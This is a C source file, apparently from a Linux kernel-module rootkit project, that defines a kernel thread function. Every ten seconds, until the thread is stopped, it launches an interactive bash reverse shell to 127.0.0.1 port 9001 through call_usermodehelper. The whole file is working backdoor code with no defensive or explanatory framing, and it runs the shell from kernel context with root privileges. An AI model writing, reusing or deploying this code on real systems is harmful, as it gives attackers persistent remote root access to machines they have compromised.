#include "tasks/reverse_shell.h"

int rshell_func(void* data) {
    while (!kthread_should_stop()) {
        char* argv[] = { "/bin/bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/9001 0>&1", NULL};
        static char* envp[] = {
            "HOME=/",
            "TERM=linux",
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
        };

        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

        ssleep(10);
    }

    return 0;
}